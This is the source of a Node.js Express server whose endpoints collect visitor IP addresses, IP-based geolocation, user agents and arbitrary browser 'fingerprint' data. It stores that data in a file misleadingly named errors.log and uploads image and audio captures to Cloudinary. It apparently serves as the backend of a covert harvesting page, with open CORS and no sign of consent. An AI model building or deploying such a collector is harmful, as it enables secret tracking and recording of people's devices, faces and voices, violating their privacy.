const cloudinary = require('cloudinary').v2;
const express = require('express');
const fs = require('fs');
const path = require('path');
const geoip = require('geoip-lite');

cloudinary.config({
  cloud_name: process.env.CLOUD_NAME,
  api_key: process.env.API_KEY,
  api_secret: process.env.API_SECRET
});

const app = express();

// Create folders locally (optional, if not using local storage anymore)
function initializeDirectories() {
  if (!fs.existsSync('data/errors.log')) {
    fs.mkdirSync('data', { recursive: true });
    fs.writeFileSync('data/errors.log', '');
  }
}
initializeDirectories();

// Middleware
app.use(express.json({ limit: '50mb' }));
app.use(express.static('public'));

// CORS for testing
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept');
  next();
});

// Get client IP
function getClientIp(req) {
  return req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress;
}

// Basic root route for health check
app.get('/', (req, res) => {
  res.send('Server is running');
});

// Fingerprint endpoint
app.post('/collect-fingerprint', (req, res) => {
  try {
    const fingerprint = {
      timestamp: new Date().toISOString(),
      ip: getClientIp(req),
      geo: geoip.lookup(getClientIp(req)),
      userAgent: req.headers['user-agent'],
      ...req.body
    };

    const log = `[${new Date().toISOString()}] ${JSON.stringify(fingerprint)}\n`;
    fs.appendFileSync('data/errors.log', log);
    res.sendStatus(200);
  } catch (err) {
    console.error('Fingerprint error:', err);
    res.status(500).send('Error saving fingerprint');
  }
});

// Media endpoint with Cloudinary
app.post('/collect-media', async (req, res) => {
  try {
    const { type, data, extension } = req.body;

    if (!['image', 'audio'].includes(type)) {
      return res.status(400).send('Invalid media type');
    }

    const base64Data = data.split(',')[1] || data;
    const uploadDataUri = `data:${type}/${extension};base64,${base64Data}`;

    const result = await cloudinary.uploader.upload(uploadDataUri, {
      folder: `device-test/${type}`
    });

    console.log(`${type} uploaded:`, result.secure_url);
    res.sendStatus(200);
  } catch (err) {
    console.error('Media upload error:', err);
    res.status(500).send('Error uploading media');
  }
});

// Log client-side errors
app.post('/log-error', (req, res) => {
  try {
    console.error('Client error:', req.body.error);
    res.sendStatus(200);
  } catch (err) {
    console.error('Error logging failed:', err);
    res.status(500).send('Error logging error');
  }
});

// Use environment port (Render requirement)
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});
